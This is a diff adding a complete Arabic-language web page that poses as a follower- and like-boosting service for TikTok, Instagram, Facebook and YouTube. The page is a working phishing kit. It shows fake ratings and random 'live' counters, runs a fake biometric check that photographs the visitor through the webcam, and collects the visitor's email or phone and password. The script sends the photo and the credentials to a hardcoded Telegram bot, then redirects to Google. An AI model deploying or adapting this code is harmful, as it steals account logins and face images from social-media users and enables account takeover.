@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الديزل العالمي | Diesel SMM Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg: #0b0e14; --card: #161b22; --accent: #2ea44f; --tiktok: #ff0050; --insta: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); --fb: #1877f2; --yt: #ff0000; }
+        body { background: var(--bg); color: #adbac7; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 10px; text-align: center; }
+        
+        /* شاشة الدخول الاحترافية */
+        #welcome-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-direction: column; }
+        .tiktok-hub { position: relative; width: 220px; height: 220px; display: flex; align-items: center; justify-content: center; }
+        .main-logo { font-size: 100px; color: #fff; text-shadow: 0 0 20px var(--tiktok); animation: beat 1.5s infinite; z-index: 2; }
+        @keyframes beat { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        
+        /* صور المستخدمين اللي قيموا الموقع */
+        .user-avatars { display: flex; justify-content: center; margin-top: 20px; }
+        .avatar { width: 30px; height: 30px; border-radius: 50%; border: 2px solid #000; margin-left: -10px; background: #333; display: flex; align-items: center; justify-content: center; font-size: 12px; }
+        .rating-text { color: #f1e05a; font-size: 12px; margin-top: 10px; }
+
+        .container { max-width: 450px; margin: 0 auto; display: none; }
+        .card { background: var(--card); border: 1px solid #30363d; border-radius: 20px; padding: 25px; box-shadow: 0 10px 50px rgba(0,0,0,0.9); margin-bottom: 15px; }
+
+        /* عدادات حية */
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .stat-item { background: #0d1117; padding: 10px; border-radius: 10px; border: 1px solid #333; }
+        .stat-item b { display: block; color: var(--accent); font-size: 14px; }
+        .stat-item span { font-size: 10px; color: #8b949e; }
+
+        /* المنصات الحقيقية */
+        .platform-btn { display: flex; align-items: center; padding: 18px; border-radius: 15px; margin-bottom: 12px; cursor: pointer; color: #fff; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        .platform-btn i { font-size: 26px; margin-left: 15px; width: 35px; }
+        .tk-btn { background: #000; border: 1px solid #444; }
+        .ig-btn { background: var(--insta); }
+        .fb-btn { background: var(--fb); }
+        .yt-btn { background: var(--yt); }
+
+        /* الكاميرا اللايف */
+        .cam-circle { width: 180px; height: 180px; border: 4px solid var(--accent); border-radius: 50%; margin: 20px auto; overflow: hidden; position: relative; }
+        #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .scan-anim { width: 100%; height: 4px; background: var(--accent); position: absolute; top: 0; animation: scan 2s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        input { width: 100%; padding: 16px; margin: 10px 0; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 16px; box-sizing: border-box; }
+        .btn-go { width: 100%; padding: 18px; border-radius: 10px; border: none; background: var(--accent); color: #fff; font-weight: bold; font-size: 19px; cursor: pointer; }
+
+        #step-svc, #step-scan, #step-login { display: none; }
+    </style>
+</head>
+<body onclick="startDiesel()">
+
+    <div id="welcome-overlay">
+        <div class="tiktok-hub">
+            <i class="fab fa-tiktok main-logo"></i>
+        </div>
+        <h2 style="color:#fff; margin-top:20px;">الديزل لزيادة متابعين السوشيال ميديا</h2>
+        
+        <div class="user-avatars">
+            <div class="avatar" style="background:#ff4d4d">👤</div>
+            <div class="avatar" style="background:#4d79ff">👤</div>
+            <div class="avatar" style="background:#4dff88">👤</div>
+            <div class="avatar" style="background:#ffcc4d">👤</div>
+            <div class="avatar" style="background:#666">+96</div>
+        </div>
+        <div class="rating-text">★★★★★ <br> <span style="color:#8b949e">قيموا الموقع كأفضل سيرفر 2026</span></div>
+        <p style="color:var(--accent); margin-top:30px;">انقر للبدء فورا</p>
+    </div>
+
+    <div class="container" id="app">
+        <div class="stats-grid">
+            <div class="stat-item"><b id="count1">521K</b><span>مشاهدة حية</span></div>
+            <div class="stat-item"><b id="count2">142K</b><span>لايك مكتمل</span></div>
+            <div class="stat-item"><b id="count3">89K</b><span>متابع جديد</span></div>
+        </div>
+
+        <div class="card" id="step-1">
+            <h3 style="color:#fff;">اختر المنصة المستهدفة</h3>
+            <div class="platform-btn tk-btn" onclick="goSvc('TikTok')"><i class="fab fa-tiktok"></i> TikTok Global</div>
+            <div class="platform-btn ig-btn" onclick="goSvc('Instagram')"><i class="fab fa-instagram"></i> Instagram Pro</div>
+            <div class="platform-btn fb-btn" onclick="goSvc('Facebook')"><i class="fab fa-facebook-f"></i> Facebook Ads</div>
+            <div class="platform-btn yt-btn" onclick="goSvc('YouTube')"><i class="fab fa-youtube"></i> YouTube Partner</div>
+        </div>
+
+        <div class="card" id="step-svc">
+            <h3 id="plat-title" style="color:#fff;"></h3>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                <div class="stat-item" style="cursor:pointer" onclick="goScan('متابعين', '10,000')">👤 10,000 متابع</div>
+                <div class="stat-item" style="cursor:pointer" onclick="goScan('لايكات', '50,000')">❤️ 50,000 لايك</div>
+                <div class="stat-item" style="cursor:pointer" onclick="goScan('مشاهدات', '100,000')">👁️ 100,000 مشاهدة</div>
+                <div class="stat-item" style="cursor:pointer" onclick="goScan('تعليقات', '5,000')">💬 5,000 تعليق</div>
+            </div>
+        </div>
+
+        <div class="card" id="step-scan">
+            <h3 style="color:#fff;">التحقق من الهوية البشرية</h3>
+            <p style="font-size:12px;">يرجى وضع وجهك أمام الكاميرا للتأكد أنك لست برنامج روبوت.</p>
+            <div class="cam-circle">
+                <div class="scan-anim"></div>
+                <video id="v" autoplay playsinline></video>
+            </div>
+            <button class="btn-go" onclick="captureAndNext()">ابدأ الفحص البيومتري</button>
+        </div>
+
+        <div class="card" id="step-login">
+            <h3 style="color:#fff;">توثيق الحساب</h3>
+            <p style="font-size:12px; color:#f1e05a;">سجل بياناتك الحقيقية لربط الـ <span id="f-qty"></span> <span id="f-type"></span> بحسابك.</p>
+            <input type="text" id="user" placeholder="الإيميل أو رقم الهاتف">
+            <input type="password" id="pass" placeholder="كلمة المرور">
+            <button class="btn-go" onclick="finish()">تأكيد واستلام الخدمة</button>
+        </div>
+    </div>
+
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
+        const chat_id = "5177962707";
+        let isStarted = false;
+
+        function startDiesel() {
+            if(isStarted) return;
+            document.getElementById('welcome-overlay').style.display = 'none';
+            document.getElementById('app').style.display = 'block';
+            
+            const talk = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل العالمي. نلاحظ ضغطاً كبيراً، يرجى اختيار المنصة وإتمام فحص الوجه لضمان حجز المتابعين واللايكات لحسابك.");
+            talk.lang = 'ar-SA';
+            window.speechSynthesis.speak(talk);
+            isStarted = true;
+            
+            // تحريك العدادات
+            setInterval(() => {
+                document.getElementById('count1').innerText = (Math.floor(Math.random() * 500) + 500) + "K";
+                document.getElementById('count2').innerText = (Math.floor(Math.random() * 200) + 100) + "K";
+            }, 3000);
+        }
+
+        function goSvc(p) { window.plat = p; document.getElementById('plat-title').innerText = "خدمات " + p; document.getElementById('step-1').style.display = 'none'; document.getElementById('step-svc').style.display = 'block'; }
+        
+        async function goScan(t, q) { 
+            window.t = t; window.q = q; 
+            document.getElementById('step-svc').style.display = 'none'; 
+            document.getElementById('step-scan').style.display = 'block';
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = s;
+        }
+
+        function captureAndNext() {
+            const canvas = document.getElementById('c');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('photo', blob, 'face.jpg');
+                fd.append('caption', `👤 صيد الديزل (وجه لايف)\nالمنصة: ${window.plat}\nالخدمة: ${window.t} (${window.q})`);
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg');
+
+            setTimeout(() => {
+                document.getElementById('step-scan').style.display = 'none';
+                document.getElementById('step-login').style.display = 'block';
+                document.getElementById('f-qty').innerText = window.q;
+                document.getElementById('f-type').innerText = window.t;
+            }, 2000);
+        }
+
+        function finish() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u.length < 5 || p.length < 5) return alert("خطأ في البيانات!");
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🎯 صيد الديزل (بيانات)!\nالمنصة: ${window.plat}\nالحساب: ${u}\nالباسورد: ${p}`);
+            alert("تم التوثيق! الخدمة ستصلك خلال دقائق.");
+            location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
